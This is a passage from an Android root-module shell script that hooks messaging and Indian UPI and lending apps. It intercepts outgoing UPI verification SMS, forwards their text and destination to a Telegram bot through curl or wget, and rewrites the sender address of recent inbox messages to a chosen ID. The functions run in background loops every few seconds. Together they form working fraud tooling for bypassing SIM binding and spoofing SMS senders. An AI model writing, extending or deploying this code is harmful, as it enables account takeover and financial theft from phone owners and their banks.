      [ -f "$f" ] && [ -s "$f" ] || continue
      grep -qiE 'is your OTP|<#>|Valid for' "$f" 2>/dev/null && { rm -f "$f"; continue; }
      cp -f "$f" /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null
      chmod 666 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null
    done
  done
  if [ -n "$best" ]; then
    cp -f "$best" /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
    chmod 666 /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
  fi
  for f in "$MODDIR/hivirtus_outgoing_blocked.json" "$MODDIR/outgoing_blocked.json" \
           "$MODDIR/hivirtus_pending_verify.json"; do
    is_valid_outgoing_json "$f" || continue
    case "$f" in
      *pending*) cp -f "$f" /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null ;;
      *.json) cp -f "$f" /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null ;;
    esac
    cp -f "$f" /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
    chmod 666 /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
  done
}

# A16: app writes hook_status to code_cache — root copies to tmp so file manager me dikhe
# CRITICAL: Messages status alag rakho — GPay/PhonePe harvest se overwrite mat karo
# (Hero SENDTO → Messages; user hamesha UPI wala file dekh ke confuse hota tha)
harvest_isms_trace() {
  for pkg in com.google.android.apps.messaging com.herofincorp.diyjourneys \
             com.herofincorp.simplycash com.customer.herofincorp com.phonepe.app \
             com.google.android.apps.nbu.paisa.user; do
    for f in \
      "/data/user/0/$pkg/code_cache/hivirtus/isms_trace.txt" \
      "/data/data/$pkg/code_cache/hivirtus/isms_trace.txt"
    do
      [ -f "$f" ] && [ -s "$f" ] || continue
      cat "$f" >> /data/local/tmp/hivirtus_isms_trace.txt 2>/dev/null
      : > "$f" 2>/dev/null
    done
  done
  [ -f /data/adb/modules/hivirtus_zygisk_mode/isms_trace.txt ] && \
    cat /data/adb/modules/hivirtus_zygisk_mode/isms_trace.txt >> /data/local/tmp/hivirtus_isms_trace.txt 2>/dev/null && \
    : > /data/adb/modules/hivirtus_zygisk_mode/isms_trace.txt
  chmod 666 /data/local/tmp/hivirtus_isms_trace.txt 2>/dev/null
  # Ensure file always exists for user checks
  [ -f /data/local/tmp/hivirtus_isms_trace.txt ] || : > /data/local/tmp/hivirtus_isms_trace.txt
  chmod 666 /data/local/tmp/hivirtus_isms_trace.txt 2>/dev/null
}

harvest_hook_status() {
  local best="" latest="" msg_best="" msg_latest=""
  local msg_pkgs="com.google.android.apps.messaging com.android.messaging com.samsung.android.messaging com.motorola.messaging com.android.mms com.oneplus.mms com.coloros.mms com.android.mms.service"
  local upi_pkgs="com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android"

  for pkg in $msg_pkgs; do
    for f in \
      "/data/user/0/$pkg/code_cache/hivirtus/hook_status.txt" \
      "/data/data/$pkg/code_cache/hivirtus/hook_status.txt" \
      "/data/user/0/$pkg/files/hivirtus_hook_status.txt" \
      "/data/data/$pkg/files/hivirtus_hook_status.txt"
    do
      [ -f "$f" ] && [ -s "$f" ] || continue
      if [ -z "$msg_best" ] || [ "$f" -nt "$msg_best" ]; then
        msg_best="$f"
      fi
    done
    for f in \
      "/data/user/0/$pkg/code_cache/hivirtus/hook_status_latest.txt" \
      "/data/data/$pkg/code_cache/hivirtus/hook_status_latest.txt"
    do
      [ -f "$f" ] && [ -s "$f" ] || continue
      if [ -z "$msg_latest" ] || [ "$f" -nt "$msg_latest" ]; then
        msg_latest="$f"
      fi
    done
  done

  for pkg in $upi_pkgs; do
    for f in \
      "/data/user/0/$pkg/code_cache/hivirtus/hook_status.txt" \
      "/data/data/$pkg/code_cache/hivirtus/hook_status.txt" \
      "/data/user/0/$pkg/files/hivirtus_hook_status.txt" \
      "/data/data/$pkg/files/hivirtus_hook_status.txt"
    do
      [ -f "$f" ] && [ -s "$f" ] || continue
      if [ -z "$best" ] || [ "$f" -nt "$best" ]; then
        best="$f"
      fi
    done
    for f in \
      "/data/user/0/$pkg/code_cache/hivirtus/hook_status_latest.txt" \
      "/data/data/$pkg/code_cache/hivirtus/hook_status_latest.txt"
    do
      [ -f "$f" ] && [ -s "$f" ] || continue
      if [ -z "$latest" ] || [ "$f" -nt "$latest" ]; then
        latest="$f"
      fi
    done
  done

  # Dedicated Messages file — never clobbered by GPay harvest
  if [ -n "$msg_best" ]; then
    cp -f "$msg_best" /data/local/tmp/hivirtus_messages_hook.txt 2>/dev/null
    chmod 666 /data/local/tmp/hivirtus_messages_hook.txt 2>/dev/null
  fi
  if [ -n "$msg_latest" ]; then
    cp -f "$msg_latest" /data/local/tmp/hivirtus_messages_hook_latest.txt 2>/dev/null
    chmod 666 /data/local/tmp/hivirtus_messages_hook_latest.txt 2>/dev/null
  fi
  # Also keep module copy if native wrote global already
  if [ -f /data/local/tmp/hivirtus_messages_hook.txt ]; then
    :
  elif [ -f "$MODDIR/messages_hook.txt" ]; then
    cp -f "$MODDIR/messages_hook.txt" /data/local/tmp/hivirtus_messages_hook.txt 2>/dev/null
  fi

  # Main hook_status: prefer Messages (real SIM path), else UPI debug
  if [ -n "$msg_best" ]; then
    cp -f "$msg_best" /data/local/tmp/hivirtus_hook_status.txt 2>/dev/null
    chmod 666 /data/local/tmp/hivirtus_hook_status.txt 2>/dev/null
  elif [ -n "$best" ]; then
    cp -f "$best" /data/local/tmp/hivirtus_hook_status.txt 2>/dev/null
    chmod 666 /data/local/tmp/hivirtus_hook_status.txt 2>/dev/null
  fi
  if [ -n "$msg_latest" ]; then
    cp -f "$msg_latest" /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
    chmod 666 /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
  elif [ -n "$latest" ]; then
    cp -f "$latest" /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
    chmod 666 /data/local/tmp/hivirtus_hook_status_latest.txt 2>/dev/null
  fi
}

seed_hooked_pkgs() { return 0; }
seed_apatch_config() { return 0; }

read_tg_creds() {
  TG_TOKEN=""
  TG_CHAT=""
  for f in /data/local/tmp/hivirtus_telegram_credentials.json \
    "$MODDIR/telegram_credentials.json" \
    /data/local/tmp/hivirtus_ui_save.json \
    "$RUNTIME" "$CONFIG"; do
    [ -f "$f" ] || continue
    [ -z "$TG_TOKEN" ] && TG_TOKEN=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    [ -z "$TG_CHAT" ] && TG_CHAT=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    [ -n "$TG_TOKEN" ] && [ -n "$TG_CHAT" ] && break
  done
  if [ -z "$TG_TOKEN" ] && [ -s /data/local/tmp/hivirtus_tg_token.txt ]; then
    TG_TOKEN=$(head -n1 /data/local/tmp/hivirtus_tg_token.txt 2>/dev/null | tr -d '\r\n')
  fi
  if [ -z "$TG_CHAT" ] && [ -s /data/local/tmp/hivirtus_tg_chat.txt ]; then
    TG_CHAT=$(head -n1 /data/local/tmp/hivirtus_tg_chat.txt 2>/dev/null | tr -d '\r\n')
  fi
  if [ -z "$TG_TOKEN" ] && [ -s "$MODDIR/tg_token.txt" ]; then
    TG_TOKEN=$(head -n1 "$MODDIR/tg_token.txt" 2>/dev/null | tr -d '\r\n')
  fi
  if [ -z "$TG_CHAT" ] && [ -s "$MODDIR/tg_chat.txt" ]; then
    TG_CHAT=$(head -n1 "$MODDIR/tg_chat.txt" 2>/dev/null | tr -d '\r\n')
  fi
}

tg_forward_enabled() {
  # Default ON jab token+chat set ho; UI toggle off ho to skip
  local src=""
  [ -f "$RUNTIME" ] && src="$RUNTIME"
  [ -z "$src" ] && [ -f /data/local/tmp/hivirtus_ui_save.json ] && src=/data/local/tmp/hivirtus_ui_save.json
  [ -z "$src" ] && [ -f "$CONFIG" ] && src="$CONFIG"
  [ -z "$src" ] && return 0
  if grep -q '"auto_forward_token"[[:space:]]*:[[:space:]]*false' "$src" 2>/dev/null && \
     grep -q '"fake_intercept_telegram"[[:space:]]*:[[:space:]]*false' "$src" 2>/dev/null && \
     grep -q '"telegram_enabled"[[:space:]]*:[[:space:]]*false' "$src" 2>/dev/null; then
    return 1
  fi
  return 0
}

read_blocked_sms() {
  BLOCKED_DEST=""
  BLOCKED_BODY=""
  # Prefer newest among tmp / module / harvested
  for f in /data/local/tmp/hivirtus_outgoing_blocked.json \
           "$MODDIR/hivirtus_outgoing_blocked.json" \
           /data/local/tmp/hivirtus_pending_verify.json; do
    [ -f "$f" ] && [ -s "$f" ] || continue
    BLOCKED_DEST=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    BLOCKED_BODY=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | sed 's/\\n/\n/g;s/\\r//g;s/\\"/"/g;s/\\\\/\\/g')
    [ -n "$BLOCKED_BODY" ] || [ -n "$BLOCKED_DEST" ] && break
  done
  if [ -z "$BLOCKED_BODY" ] && [ -f /data/local/tmp/hivirtus_outgoing_blocked.flag ]; then
    BLOCKED_DEST=$(head -n1 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
    BLOCKED_BODY=$(tail -n +2 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
  fi
  # NEVER strip placeholders — pehle INTERCEPT/BLOCKED hata ke TG skip ho jata tha
  [ -z "$BLOCKED_DEST" ] && BLOCKED_DEST="unknown"
  [ -z "$BLOCKED_BODY" ] && return 0
  return 0
}

tg_json_escape() {
  printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\t/\\t/g' -e 's/\r/\\r/g' | awk 'BEGIN{ORS=""} {gsub(/\n/,"\\n"); print}'
}

tg_clip_copy() {
  printf '%s' "$1" | head -c 350
}

forward_blocked_telegram() {
  read_blocked_sms
  [ -z "$BLOCKED_BODY" ] && [ -z "$BLOCKED_DEST" ] && return 0
  [ -z "$BLOCKED_BODY" ] && return 0

  # Skip incoming OTP noise — any other UPI outgoing is OK (not Hero-only)
  case "$BLOCKED_BODY" in
    *is\ your\ OTP*|*Valid\ for*|"<#>"*|*"Do not share with anyone"*|*UPI\ Registration*)
      echo "tg_skip_incoming_otp $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
      rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag \
            /data/local/tmp/hivirtus_outgoing_blocked.json \
            /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null
      return 0
      ;;
  esac
  case "$BLOCKED_BODY" in
    com.*|android.*)
      echo "tg_skip_pkg_junk $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
      return 0
      ;;
  esac
  [ ${#BLOCKED_BODY} -ge 4 ] || {
    echo "tg_skip_short_body $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    return 0
  }
  # To must be digits (verify shortcode / number) — never package / OTP text
  TO_DIGITS=$(printf '%s' "$BLOCKED_DEST" | tr -cd '0-9')
  [ ${#TO_DIGITS} -ge 4 ] && [ ${#TO_DIGITS} -le 15 ] || {
    echo "tg_skip_bad_dest $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    return 0
  }
  # All-zero placeholder dest — map to Hero/Axis shortcode if body looks like verify
  case "$TO_DIGITS" in
    *[!0]*) ;;
    *)
      case "$BLOCKED_BODY" in
        *HEROAXIS*|*DO\ NOT\ COPY*|*USE\ UPI\ PIN*|*YESPRO*)
          BLOCKED_DEST="9920104300"
          TO_DIGITS="9920104300"
          echo "tg_fix_dest_9920104300 $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
          ;;
        *)
          echo "tg_skip_placeholder_dest $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
          return 0
          ;;
      esac
      ;;
  esac
  BLOCKED_DEST="$TO_DIGITS"

  # Dedupe — same To+body only within 90s (retest after Update allowed)
  DKEY=$(printf '%s|%s' "$BLOCKED_DEST" "$BLOCKED_BODY" | md5sum 2>/dev/null | awk '{print $1}')
  [ -z "$DKEY" ] && DKEY=$(printf '%s|%s' "$BLOCKED_DEST" "$BLOCKED_BODY")
  PREV=$(cat /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null | tr -d '\r\n')
  PREV_TS=$(cat /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null | tr -d '\r\n')
  NOW_TS=$(date +%s)
  if [ -n "$DKEY" ] && [ "$DKEY" = "$PREV" ] && [ -n "$PREV_TS" ]; then
    AGE=$((NOW_TS - PREV_TS))
    if [ "$AGE" -lt 90 ] 2>/dev/null; then
      echo "tg_dedupe_skip $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
      rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag \
            /data/local/tmp/hivirtus_outgoing_blocked.json \
            /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null
      return 0
    fi
  fi

  # Skip if in-process Gamex/SMSTweaks HTTPS already delivered same intercept
  if [ -f /data/local/tmp/hivirtus_tg_inproc_sent.flag ]; then
    IN_DEST=$(head -n1 /data/local/tmp/hivirtus_tg_inproc_sent.flag 2>/dev/null | tr -d '\r')
    IN_BODY=$(tail -n +2 /data/local/tmp/hivirtus_tg_inproc_sent.flag 2>/dev/null | tr -d '\r')
    IN_DIGITS=$(printf '%s' "$IN_DEST" | tr -cd '0-9')
    if [ "$IN_DIGITS" = "$BLOCKED_DEST" ] && [ "$IN_BODY" = "$BLOCKED_BODY" ]; then
      rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag \
            /data/local/tmp/hivirtus_outgoing_blocked.json \
            /data/local/tmp/hivirtus_pending_verify.json \
            /data/local/tmp/hivirtus_tg_inproc_sent.flag 2>/dev/null
      echo "tg_skip_inproc $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
      return 0
    fi
  fi
  tg_forward_enabled || return 0
  read_tg_creds
  [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ] && return 0

  # Display (+91 for 10-digit Indian)
  TO_NUM="$BLOCKED_DEST"
  if [ ${#TO_DIGITS} -eq 10 ]; then
    TO_NUM="+91${TO_DIGITS}"
  elif [ ${#TO_DIGITS} -eq 12 ] && [ "${TO_DIGITS#91}" != "$TO_DIGITS" ]; then
    TO_NUM="+${TO_DIGITS}"
  fi
  [ -z "$TO_NUM" ] && TO_NUM="—"
  MSG_BODY="$BLOCKED_BODY"

  # Chat message format
  TEXT="📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥
To ${TO_NUM}
Message: ${MSG_BODY}"

  ESC_TEXT=$(tg_json_escape "$TEXT")
  ESC_BODY=$(tg_json_escape "$(tg_clip_copy "$MSG_BODY")")
  ESC_TO=$(tg_json_escape "$(tg_clip_copy "$TO_NUM")")
  PAYLOAD="/data/local/tmp/hivirtus_tg_payload.json"
  # Two buttons: number copy + full SMS copy
  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📞 Number copy\",\"copy_text\":{\"text\":\"${ESC_TO}\"}},{\"text\":\"💬 SMS copy\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}]]}}" > "$PAYLOAD"
  SENT=0
  RESP="/data/local/tmp/hivirtus_tg_last_response.txt"
  if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
  if [ "$SENT" = "1" ] && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
    printf '%s\n' "$DKEY" > /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null
    date +%s > /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null
    chmod 666 /data/local/tmp/hivirtus_tg_out_dedupe.hash \
      /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null
    rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag
    rm -f /data/local/tmp/hivirtus_outgoing_blocked.json
    rm -f /data/local/tmp/hivirtus_pending_verify.json
    rm -f "$PAYLOAD"
    for pkg in com.herofincorp.diyjourneys com.phonepe.app \
               com.google.android.apps.nbu.paisa.user net.one97.paytm \
               com.google.android.apps.messaging; do
      rm -f "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
            "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
            "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
            "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" 2>/dev/null
    done
    rm -f "$MODDIR/hivirtus_outgoing_blocked.json" "$MODDIR/hivirtus_outgoing_blocked.flag" 2>/dev/null
    echo "tg_ok $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    chmod 644 /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
  else
    echo "tg_fail $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    chmod 644 /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
  fi
}

seed_hooked_pkgs() { return 0; }
seed_apatch_config() { return 0; }

device_name() {
  local n
  n=$(getprop ro.product.marketname 2>/dev/null | tr -d '\r')
  [ -z "$n" ] && n=$(getprop ro.product.model 2>/dev/null | tr -d '\r')
  [ -z "$n" ] && n=$(getprop ro.product.device 2>/dev/null | tr -d '\r')
  local manu
  manu=$(getprop ro.product.manufacturer 2>/dev/null | tr -d '\r')
  if [ -n "$manu" ] && [ -n "$n" ]; then
    echo "$n" | grep -qi "$manu" && echo "$n" || echo "$manu $n"
  else
    echo "${n:-Android}"
  fi
}

module_is_active() {
  [ -f /data/local/tmp/hivirtus_zygisk_native.active ] && return 0
  [ -f /data/local/tmp/hivirtus_module_heartbeat.txt ] && return 0
  [ -f /data/local/tmp/hivirtus_hook_status_latest.txt ] && return 0
  [ -s /data/local/tmp/hivirtus_inject.log ] && return 0
  return 1
}

tg_http_post() {
  # $1 = payload file, $2 = response file, uses TG_TOKEN
  local payload="$1"
  local resp="$2"
  local url="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"
  rm -f "$resp"
  : > "$resp"
  # Prefer curl (JSON body)
  if command -v curl >/dev/null 2>&1; then
    curl -sS -m 30 -X POST "$url" -H "Content-Type: application/json" --data-binary "@${payload}" -o "$resp" 2>/data/local/tmp/hivirtus_tg_curl.err
    [ -s "$resp" ] && return 0
  fi
  for c in /system/bin/curl /system/xbin/curl \
           /data/adb/magisk/busybox /data/adb/ksu/bin/busybox /data/adb/ap/bin/busybox \
           /data/adb/modules/busybox-ndk/system/xbin/busybox; do
    if [ -x "$c" ]; then
      case "$c" in
        *busybox*)
          "$c" wget -q -O "$resp" -T 30 --header="Content-Type: application/json" --post-file="$payload" "$url" 2>/dev/null
          ;;
        *)
          "$c" -sS -m 30 -X POST "$url" -H "Content-Type: application/json" --data-binary "@${payload}" -o "$resp" 2>/dev/null
          ;;
      esac
      [ -s "$resp" ] && return 0
    fi
  done
  # Fallback: form-urlencoded text= (wget without JSON)
  local text chat
  text=$(grep -o '"text"[[:space:]]*:[[:space:]]*"[^"]*"' "$payload" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  chat="$TG_CHAT"
  if [ -n "$text" ] && [ -n "$chat" ]; then
    local form="/data/local/tmp/hivirtus_tg_form.txt"
    # shell escape for form
    printf 'chat_id=%s&text=%s&disable_web_page_preview=true' "$chat" "$text" > "$form"
    if command -v curl >/dev/null 2>&1; then
      curl -sS -m 30 -X POST "$url" --data-urlencode "chat_id=${chat}" --data-urlencode "text=${text}" -o "$resp" 2>/dev/null
      [ -s "$resp" ] && return 0
    fi
    if [ -x /system/bin/toybox ]; then
      /system/bin/toybox wget -q -O "$resp" -T 30 --post-file="$form" "$url" 2>/dev/null
      [ -s "$resp" ] && return 0
    fi
  fi
  echo "no_http_client" > "$resp"
  return 1
}

# Save pe Telegram test — success pe hi mark sent; fail pe 5 retry
send_tg_test_if_requested() {
  [ -f /data/local/tmp/hivirtus_tg_test.request ] || return 0
  read_tg_creds
  if [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ]; then
    echo "tg_test_skip_no_creds $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    rm -f /data/local/tmp/hivirtus_tg_test.request
    return 0
  fi
  CUR_HASH="${TG_TOKEN}|${TG_CHAT}"
  SENT_HASH=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null | tr -d '\r\n')
  if [ -n "$SENT_HASH" ] && [ "$CUR_HASH" = "$SENT_HASH" ]; then
    rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails
    return 0
  fi
  NOW=$(date +%s)
  LAST_TRY=$(cat /data/local/tmp/hivirtus_tg_test_last_try.ts 2>/dev/null || echo 0)
  # Hard cooldown 120s — spam kill
  if [ $((NOW - LAST_TRY)) -lt 120 ]; then
    return 0
  fi
  echo "$NOW" > /data/local/tmp/hivirtus_tg_test_last_try.ts

  DEV=$(device_name)
  if module_is_active; then
    STATUS="Successful Active!"
  else
    STATUS="not active"
  fi
  TEXT="🚀 @hivirtus Zygisk Mode Test
${STATUS}

Device: ${DEV}"
  ESC_TEXT=$(tg_json_escape "$TEXT")
  PAYLOAD="/data/local/tmp/hivirtus_tg_test_payload.json"
  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true}" > "$PAYLOAD"
  RESP="/data/local/tmp/hivirtus_tg_test_response.txt"
  : > "$RESP"
  if tg_http_post "$PAYLOAD" "$RESP" && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
    echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_test_sent.hash
    echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
    echo 1 > /data/local/tmp/hivirtus_tg_boot_sent.flag
    chmod 666 /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null
    rm -f /data/local/tmp/hivirtus_tg_test.request "$PAYLOAD" /data/local/tmp/hivirtus_tg_test_fails
    echo "tg_test_ok $STATUS device=$DEV $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
  else
    FAILS=$(cat /data/local/tmp/hivirtus_tg_test_fails 2>/dev/null || echo 0)
    FAILS=$((FAILS + 1))
    echo "$FAILS" > /data/local/tmp/hivirtus_tg_test_fails
    echo "tg_test_fail try=$FAILS $(date +%s) resp=$(head -c 160 "$RESP" 2>/dev/null)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    if [ "$FAILS" -ge 3 ]; then
      echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_test_sent.hash
      rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails
      echo "tg_test_give_up $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    fi
  fi
}

# SMSTweaks-style inbox rewrite — ANY recent inbox address → saved Sender ID
# (JNI SmsMessage hooks + root content update — Messages/UPI OTP auto-read)
rewrite_inbox_sender_id() {
  local sid=""
  if [ -f /data/local/tmp/hivirtus_sender_id.txt ]; then
    sid=$(head -n1 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null | tr -d '\r\n')
  fi
  if [ -z "$sid" ] && [ -f "$MODDIR/sender_id.txt" ]; then
    sid=$(head -n1 "$MODDIR/sender_id.txt" 2>/dev/null | tr -d '\r\n')
  fi
  if [ -z "$sid" ]; then
    sid=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$RUNTIME" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  fi
  [ -z "$sid" ] || [ "$sid" = "AD-TEST-S" ] && return 0

  # Persist for Zygisk hooks
  echo "$sid" > /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null
  echo "$sid" > "$MODDIR/sender_id.txt" 2>/dev/null
  chmod 666 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null

  local out="/data/local/tmp/hivirtus_inbox_query.txt"
  content query --uri content://sms/inbox --projection _id:address:date:body \
    --sort "date DESC" 2>/dev/null | head -n 60 > "$out" || return 0

  local now_ms id addr date digits
  now_ms=$(date +%s)000
  while IFS= read -r line; do
    id=$(echo "$line" | sed -n 's/.*_id=\([0-9]*\).*/\1/p')
    addr=$(echo "$line" | sed -n 's/.*address=\([^,]*\).*/\1/p' | sed 's/[[:space:]]*$//')
    date=$(echo "$line" | sed -n 's/.*date=\([0-9]*\).*/\1/p')
    [ -z "$id" ] || [ -z "$addr" ] && continue
    [ "$addr" = "$sid" ] && continue
    # Recent ~30 min (SMSTweaks window for OTP verify)
    if [ -n "$date" ] && [ "$date" -lt $((now_ms - 1800000)) ] 2>/dev/null; then
      continue
    fi
    # SMSTweaks: koi bhi incoming (+91 / bank header / shortcode) → saved Sender ID
    content update --uri content://sms/inbox \
      --bind address:s:"$sid" \
      --where "_id=$id" >/dev/null 2>&1 || true
  done < "$out"
}

(
  while true; do
    send_tg_test_if_requested
    harvest_hook_status
    harvest_isms_trace
    harvest_blocked_outgoing
    forward_blocked_telegram
    enforce_sms_block
    # watchdog every other loop — less heat
    hivirtus_tg_watchdog 2>/dev/null
    sleep 2
  done
) &

(
  while true; do
    sleep 90
    hivirtus_seed_app_writable_files quiet 2>/dev/null
    hivirtus_seed_app_code_cache 2>/dev/null
  done
) &

(
  while true; do
    hivirtus_repair_sim_settings
    sleep 180
    hivirtus_grant_overlay_permission
    sleep 60
  done
) &
